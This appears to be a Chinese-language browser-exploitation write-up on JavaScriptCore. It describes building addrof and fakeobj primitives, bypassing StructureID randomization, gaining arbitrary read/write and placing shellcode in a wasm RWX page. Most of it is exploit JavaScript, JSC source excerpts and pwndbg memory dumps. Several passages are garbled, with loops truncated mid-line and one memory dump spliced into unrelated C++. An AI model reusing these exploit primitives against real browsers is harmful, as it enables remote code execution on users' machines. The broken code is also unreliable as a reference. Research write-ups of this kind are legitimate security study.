@@ -1,0 +1,128 @@
+（1）利用漏洞构造addrof和fakeobj原语
+（2）绕过StructureID随机化
+（3）构造任意地址读写
+（4）查找wasm rwx区域，写入shellcode，完成利用
+###  构造addrof和fakeobj原语
+根据poc可以构造出构造addrof和fakeobj原语：
+    function AddrOfFoo(arr, cmpObj)
+    {
+        arr[1] = 1.1;
+        cmpObj == 2.2; 
+        return arr[0];
+    }
+    for( let i=0; i {
+                arr[0] = obj;
+            }
+        }
+        let addr = AddrOfFoo(arr, evil);
+        return f2i(addr);
+    }
+    function FakeObjFoo(arr, cmpObj, addr)
+    {
+        arr[1] = 1.1;
+        cmpObj == 2.2;  
+        arr[0] = addr;
+    }
+    for( let i=0; i {
+                arr[0] = {};
+            }
+        }
+        FakeObjFoo(arr, evil, addr);
+        return arr[0];
+    }
+接下来是绕过StructureID随机化，JSC里面并不是所有的内建函数，机制都依赖正确的structureID，我们可以通过不验证structureID的调用路径进行伪造，泄露的正常的structureID。
+###  泄露StructureID方法一
+当加载JSArray的元素时，解释器中有一个代码路径，它永远不会访问StructureID:
+    static ALWAYS_INLINE JSValue getByVal(VM& vm, JSValue baseValue, JSValue subscript)
+    {
+        ...;
+        if (subscript.isUInt32()) {
+            uint32_t i = subscript.asUInt32();
+            if (baseValue.isObject()) {
+                JSObject* object = asObject(baseValue);
+                if (object->canGetIndexQuickly(i))
+                    return object->getIndexQuickly(i); // 【1】
+getIndexQuickly直接从butterfly加载元素，而canGetIndexQuickly只查看JSCell头部中的索引类型和butterfly中的length：
+    bool canGetIndexQuickly(unsigned i) const {
+        const Butterfly* butterfly = this->butterfly();
+        switch (indexingType()) {
+        ...;
+        case ALL_CONTIGUOUS_INDEXING_TYPES:
+            return i vectorLength() && butterfly->contiguous().at(this, i);
+    }
+我们可以伪造一个JSArray对象，填充无效的StructureID等头部字段（因为getByVal路径上不验证，所以不会报错），然后将butterfly填充为要泄露的目标对象地址，就可以将目标对象的结构当成数据输出。
+泄露StructureID的代码如下：
+    // leak entropy by getByVal
+    function LeakStructureID(obj)
+    {
+        let container = {
+            cellHeader: i2obj(0x0108230700000000), // 伪造的JSArray头部，包括StructureID等字段
+            butterfly: obj
+        };
+        let fakeObjAddr = AddrOf(container) + 0x10;
+        let fakeObj = FakeObj(fakeObjAddr);
+        f64[0] = fakeObj[0];// 访问元素会调用getByVal
+        //此时fakeObj[0]为Legitimate JSArray的JSCell，fakeObj[1]为Legitimate JSArray的butterfly
+        // repair the fakeObj's jscell
+        let structureID = u32[0];
+        u32[1] = 0x01082307 - 0x20000;
+        container.cellHeader = f64[0];
+        return structureID;
+    }
+内存布局如下：
+    // container 对象：
+    Object: 0x7fe0cc78c000 with butterfly (nil) (Structure 0x7fe0cc7bfde0:[0xd0bd, Object, {cellHeader:0, butterfly:1}, NonArray, Proto:0x7fe10cbf6de8, Leaf]), StructureID: 53437
+        pwndbg> x/4gx 0x7fe0cc78c000
+    0x7fe0cc78c000:    0x010018000000d0bd    0x0000000000000000
+    0x7fe0cc78c010:    0x0108230700000000    0x00007fe10cb7cae8 //  x/gx 0x00007fe10cb7cae8
+    0x7fe10cb7cae8:    0x010823070000f1aa // vm();
+        auto scope = DECLARE_THROW_SCOPE(vm);
+        JSValue thisValue = callFrame->thisValue();
+        if (thisValue.inherits(vm)) {
+            JSFunction* function = jsCast(thisValue);
+            if (function->isHostOrBuiltinFunction())
+                RELEASE_AND_RETURN(scope, JSValue::encode(jsMakeNontrivialString(globalObject, "function ", function->name(vm), "() {\n[native code]\n}"))); // 【1】
+            FunctionExecutable* executable = function->jsExecutable();
+            if (executable->isClass())
+                return JSValue::encode(jsString(vm, executable->classSource().view().toString()));
+            …
+【1】处会调用function->name 来获取函数名，具体调用到JSFunction::name 函数：
+    String JSFunction::name(VM& vm)
+    {
+        …
+        const Identifier identifier = jsExecutable()->name();
+        if (identifier == vm.propertyNames->builtinNames().starDefaultPrivateName())
+            return emptyString();
+        return identifier.string(); // 【2】
+    }
+    inline FunctionExecutable* JSFunction::jsExecutable() const
+    {
+        ASSERT(!isHostFunctionNonInline());
+        return static_cast(m_executable.get());
+    }
+【2】处Identifier String 保存着指向函数名的指针， identifier.string()返回函数名的字符串。对应的结构寻址过程如下：
+用gdb调试例子，为了直观展示函数名，将函数名定义为AAAAA：
+    function AAAAA(){
+            return "hellow";
+    }
+    print(describe(AAAAA));
+    print(Function.prototype.toString.call(AAAAA));
+内存布局如下：
+    Object: 0x7fd3390f5900 with butterfly (nil) (Structure 0x7fd3390f9140:[0xde6e, Function, {}, NonArray, Proto:0x7fd3794c11a8, Leaf]), StructureID: 56942
+    pwndbg> x/6gx 0x7fd3390f5900 //函数AAAAA的对象结构地址 (JSFunction object)
+    0x7fd3390f5900:    0x000e1a000000de6e    0x0000000000000000
+    0x7fd3390f5910:    0x00007fd3794bd118    0x00007fd3390e5200 //  x/12gx 0x00007fd3390e5200 // (FunctionExecutable)
+    0x7fd3390e5200:    0x00000c0000006253    0x0000000000000000
+    0x7fd3390e5210:    0x0000000000000000    0x0000000000000000
+    0x7fd3390e5220:    0x0000000000000000    0x00007fd3794a8000
+    0x7fd3390e5230:    0x0000018700000170    0x0000000e0000001a
+    0x7fd3390e5240:    0x0000200000000000    0x0000000000000000
+    0x7fd3390e5250:    0x00007fd3794a7068    0x00007fd3390e8d80 //  x/10gx 0x00007fd3390e8d80 // (UnlinkedFunctionExecutable)
+    0x7fd3390e8d80:    0x00000d000000d77e    0x000000020000001a
+    0x7fd3390e8d90:    0x0000000e0000016b    0x0000017000000000
+    0x7fd3390e8da0:    0x0000017080000017    0x0000018600000162
+    0x7fd3390e8db0:    0x0400000000000000    0x0000000000000000
+    0x7fd3390e8dc0:    0x0000000000000000    0x00007fd3794aa6c0 //  x/10gx 0x00007fd3794aa6c0 //(Identifier String)
+    0x7fd3794aa6c0:    0x000000050000000a    0x00007fd3794aa6d4 // Pointer
+                //        Flag| Length
+    0x7fd3794aa6d0:    0x414141413aace614    0x0000000000000041
